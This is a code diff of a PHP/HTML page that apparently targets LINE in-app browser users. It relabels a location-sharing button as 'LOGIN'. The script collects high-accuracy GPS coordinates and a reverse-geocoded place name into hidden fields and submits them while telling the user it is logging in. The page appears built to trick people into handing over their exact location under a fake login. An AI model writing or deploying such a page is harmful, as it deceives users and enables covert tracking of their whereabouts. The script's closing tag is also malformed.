@@ -51,106 +51,69 @@ if (strpos($userAgent, "line") === false) {
             <input type="hidden" id="locationField" name="location">
             <input type="hidden" id="placeField" name="place">
 
-            <button id="shareBtn" type="button">LOGIN</button>
+            <button id="loginBtn" type="button">LOGIN</button>
         
             <div id="status" style="margin-top:10px;color:#444;"></div>
         </form>
     </div>
 
-    <script>
-(async () => {
-    const LIFF_ID = 'YOUR_LIFF_ID'; // <-- ใส่ LIFF ID ถ้ามี (ไม่ใส่ก็ใช้ navigator.geolocation ตามปกติ)
-    let liffInited = false;
-
-    // พยายาม init LIFF เงียบๆ เพื่อให้ใช้ API ของ LIFF ได้ (ถ้ามีและคุณตั้งค่าแล้ว)
-    try {
-        if (window.liff) {
-            await liff.init({ liffId: LIFF_ID });
-            liffInited = true;
-            console.log('LIFF inited');
+<script>
+// helper: promise wrapper ของ geolocation
+function getCurrentPositionPromise(options = {}) {
+    return new Promise((resolve, reject) => {
+        if (!navigator.geolocation) {
+            reject(new Error("เบราว์เซอร์ไม่รองรับการหาตำแหน่ง"));
+            return;
         }
-    } catch (e) {
-        console.warn('LIFF init failed or LIFF_ID not set', e);
-    }
-
-    const statusEl = document.getElementById('status');
-    const shareBtn = document.getElementById('shareBtn');
-    const form = document.getElementById('mainForm');
-
-    // helper: Promise wrapper ของ getCurrentPosition
-    function getCurrentPositionPromise(options = {}) {
-        return new Promise((resolve, reject) => {
-            if (!navigator.geolocation) {
-                reject(new Error('เบราว์เซอร์ไม่รองรับ Geolocation'));
-                return;
-            }
-            navigator.geolocation.getCurrentPosition(resolve, reject, options);
-        });
-    }
-
-    // ฟังก์ชัน reverse geocode (ใช้ Nominatim เป็นตัวอย่าง — ปรับเป็น service ของคุณถ้าต้องการ)
-    async function reverseGeocode(lat, lon) {
-        try {
-            const res = await fetch(`https://nominatim.openstreetmap.org/reverse?format=json&lat=${lat}&lon=${lon}&zoom=18&addressdetails=1`);
-            if (!res.ok) return null;
-            const data = await res.json();
-            return data.display_name || null;
-        } catch (e) {
-            return null;
-        }
-    }
-
-    // ฟังก์ชันหลัก: ขอพิกัดแล้ว submit form
-    async function requestAndSubmit() {
-        statusEl.textContent = 'กำลังขอตำแหน่ง... กรุณาอนุญาตเมื่อมี popup ปรากฏ';
-        shareBtn.disabled = true;
-
-        try {
-            // บาง platform ต้องให้ผู้ใช้กดก่อนจึงเรียก geolocation (เราเรียกจากปุ่มแล้ว)
-            const pos = await getCurrentPositionPromise({
-                enableHighAccuracy: true,
-                timeout: 15000,
-                maximumAge: 0
-            });
-
-            const lat = pos.coords.latitude;
-            const lon = pos.coords.longitude;
-
-            // reverse geocode (ไม่จำเป็น แต่คุณใช้จากเดิม)
-            const place = await reverseGeocode(lat, lon) || 'ไม่ทราบชื่อสถานที่';
-
-            document.getElementById('locationField').value = `${lat},${lon}`;
-            document.getElementById('placeField').value = place;
-
-            statusEl.textContent = 'ได้รับตำแหน่งแล้ว กำลังส่งข้อมูล...';
-            form.submit();
-        } catch (err) {
-            console.error(err);
-            let msg = 'ไม่สามารถรับตำแหน่งได้: ' + (err.message || err);
-            // ถ้า user ปฏิเสธ permission ให้บอกวิธีแก้ปัญหาแบบสั้น ๆ
-            if (err.code === 1 || /permission/i.test(err.message)) {
-                msg += '\nผู้ใช้ปฏิเสธการเข้าถึงตำแหน่ง — ให้ลองเปิด Location ในการตั้งค่า LINE/เบราว์เซอร์:\n' +
-                       'iPhone: Settings > LINE > Location (หรือ Settings > Privacy & Security > Location Services > LINE)\n' +
-                       'Android: Settings > Apps > LINE > Permissions > Location';
-            } else if (err.code === 2) {
-                msg += '\nตำแหน่งไม่พร้อม (ลองออกไปที่โล่งแจ้ง หรือเปิด GPS และเชื่อมต่ออินเทอร์เน็ต)';
-            } else if (err.code === 3) {
-                msg += '\nหมดเวลา (timeout) — ลองกดแชร์อีกครั้งพร้อมเปิด GPS และสัญญาณเน็ต';
-            }
-            statusEl.textContent = msg;
-            shareBtn.disabled = false;
-        }
-    }
-
-    shareBtn.addEventListener('click', async (e) => {
-        // เรียกจากผู้ใช้กด -> ปลอดภัยตามแนวทางของ iOS/Android/LIFF
-        await requestAndSubmit();
+        navigator.geolocation.getCurrentPosition(resolve, reject, options);
     });
+}
 
-    // คำแนะนำเพิ่มเติม (แสดงเมื่อเปิดใน LINE แต่ไม่อนุญาต)
-    // ถ้าต้องการฟีเจอร์เฉพาะของ LINE (เช่นแสดงหน้าจอ Permission ของ LIFF) ให้ดู LIFF docs
-})();
-</script>
+async function reverseGeocode(lat, lon) {
+    try {
+        const res = await fetch(
+            `https://nominatim.openstreetmap.org/reverse?format=json&lat=${lat}&lon=${lon}&zoom=18&addressdetails=1`
+        );
+        if (!res.ok) return null;
+        const data = await res.json();
+        return data.display_name || null;
+    } catch {
+        return null;
+    }
+}
+
+document.getElementById("loginBtn").addEventListener("click", async () => {
+    const statusEl = document.getElementById("status");
+    const form = document.getElementById("mainForm");
+    const btn = document.getElementById("loginBtn");
+    btn.disabled = true;
+    statusEl.textContent = "กำลังขอตำแหน่ง... กรุณาอนุญาตเมื่อมี popup ขึ้นมา";
+
+    try {
+        const pos = await getCurrentPositionPromise({
+            enableHighAccuracy: true,
+            timeout: 15000,
+            maximumAge: 0
+        });
+        const lat = pos.coords.latitude;
+        const lon = pos.coords.longitude;
+
+        const place = await reverseGeocode(lat, lon) || "ไม่ทราบชื่อสถานที่";
+        document.getElementById("locationField").value = `${lat},${lon}`;
+        document.getElementById("placeField").value = place;
+
+        statusEl.textContent = "✅ ได้ตำแหน่งแล้ว กำลังเข้าสู่ระบบ...";
+        form.submit();
+    } catch (err) {
+        let msg = "❌ ไม่สามารถรับตำแหน่งได้: " + (err.message || err);
+        if (err.code === 1) {
+            msg += "\n\nวิธีแก้:\n- iPhone: Settings > LINE > Location > While Using the App\n- Android: Settings > Apps > LINE > Permissions > Location > Allow";
+        }
+        statusEl.textContent = msg;
+        btn.disabled = false;
+    }
+});
+</script
 </body>
 
 </html>
